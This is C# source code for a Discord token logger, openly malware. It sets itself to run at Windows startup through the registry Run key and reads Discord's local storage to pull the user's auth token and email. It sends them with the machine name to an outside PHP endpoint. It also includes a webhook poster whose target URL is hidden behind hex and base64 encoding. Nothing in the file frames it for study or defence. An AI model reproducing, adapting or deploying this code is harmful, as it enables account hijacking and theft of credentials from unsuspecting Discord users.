using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using System.Collections.Specialized;
using Microsoft.Win32;

namespace Discord_Token_Logger
{
    class Program
    {
        //Variables
        static string Tag = "TagReplace";
        static string dfas = "HookReplace";
        static string Content = "";
        
        static void Main()
        {
            string Token;
            string Email;
            string CookieLoc = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\https_discordapp.com_0.localstorage";
            string Cookie = "";
            string CheckToken = @"C:\Users\Public\Token.txt";

            using (Microsoft.Win32.RegistryKey Key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                Key.SetValue("aldwin", "\"" + Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\"");
            }

            Console.Read();
            while (true)
            {

                if (!File.Exists(CheckToken))
                {
                    File.WriteAllText(CheckToken, "Created");
                }


                try
                {
                    //Open the file for reading then read it.
                    var CookieStream = File.Open(CookieLoc, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    var CookieReader = new StreamReader(CookieStream);

                    Cookie = CookieReader.ReadToEnd();

                    //Dispose
                    CookieReader.Dispose();
                    CookieStream.Dispose();

                }
                catch { Console.Write("Failed"); Console.Read(); }

                /*--------------Get the token and Email--------------*/
                //Gets the token
                Token = Cookie.Substring(Cookie.IndexOf("token\"") + 5);
                Token = Token.Substring(0, 121);
                Token = Token.Replace("\0", string.Empty);
                //Gets the Email
                Email = Cookie.Substring(Cookie.IndexOf("email_cache\"") + 12);
                Email = Email.Substring(0, Email.IndexOf("\""));
                Email = Email.Replace("\0", string.Empty);

                /*---------------Send the token and Email---------------*/
                if (Token != File.ReadAllText(CheckToken) && Token != "" && !Token.Contains("\0002"))
                {
                    Console.WriteLine(Token);
                    File.WriteAllText(CheckToken, Token);
                    var WC = new WebClient();
                    WC.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                    try
                    { //Gets the IP & its info.
                        Content = WC.DownloadString($"https://littest.site/Projects/format.php?T={Token}&E={Email}&N={Environment.MachineName}" );
                    }
                    catch { };

                    WC.Dispose();

                }
                
                return;
            }
        }

        private static void hjkl()
        {
            var WC = new WebClient();

            var Js = new NameValueCollection{
                {
                    "username",
                    Tag + "  -Token Logger" //Name
                },
                {
                    "avatar_url",
                    "https://vgy.me/XL10ux.png" //PFP
                },
                {
                    "content",
                    Content //Content
                }
            }; //Post to webhook
            WC.UploadValues((new ASCIIEncoding()).GetString(Convert.FromBase64String(Enumerable.Range(0, dfas.Length / 2).Select(i => dfas.Substring(i * 2, 2)).Select(x => (char)Convert.ToInt32(x, 16)).Aggregate(new StringBuilder(), (x, y) => x.Append(y)).ToString())), Js);
        }
    }
}
